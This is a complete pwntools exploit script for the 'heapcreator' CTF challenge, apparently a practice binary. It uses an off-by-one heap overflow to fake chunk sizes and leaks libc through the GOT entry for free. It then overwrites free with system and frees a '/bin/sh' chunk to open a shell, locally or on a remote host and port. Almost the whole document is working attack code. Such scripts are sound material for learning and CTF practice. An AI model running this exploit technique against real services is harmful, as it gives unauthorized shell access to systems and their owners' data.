#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./heapcreator",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")

def add(size,content):
    con.sendlineafter("choice :","1")
    con.sendlineafter("Heap :",str(size))
    con.sendafter("heap:",content)
def show(index):
    con.sendlineafter("choice :","3")
    con.sendlineafter("Index :",str(index))
    return con.recvuntil("Done")
def delete(index):
    con.sendlineafter("choice :","4")
    con.sendlineafter("Index :",str(index))
def edit(index,content):
    con.sendlineafter("choice :","2")
    con.sendlineafter("Index :",str(index))
    con.sendafter("heap : ",content)
def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    add(0x48,"a\n")
    add(0x10,"a\n")
    add(0x40,"/bin/sh\x00\n")
    #overwirte the next chunk's szie
    edit(0,"a"*0x48+"\x41")
    delete(1)
    #overwrite pointer in heap struct
    add(0x30,"d"*0x20+p64(0x30)+p64(code.got['free']))
    #leak 
    data=show(1)
    data=data.split("Content : ")[1][:6]
    libc.address = u64(data.ljust(8,"\x00"))-libc.symbols['free']
    #overwrite got
    edit(1,p64(libc.symbols['system']))
    delete(2)
exploit()
con.interactive()    
